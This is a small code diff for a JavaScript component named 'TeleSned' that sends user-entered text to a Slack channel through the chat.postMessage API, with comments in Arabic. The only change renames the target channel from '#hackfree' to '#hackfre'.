@@ -6,7 +6,7 @@ export const TeleSned = () => {
         const url = 'https://slack.com/api/chat.postMessage';
 
         const payload = {
-            channel: '#hackfree', // تحديد القناة مباشرة
+            channel: '#hackfre', // تحديد القناة مباشرة
             text: des // تعيين النص من البيانات المدخلة
         };
 
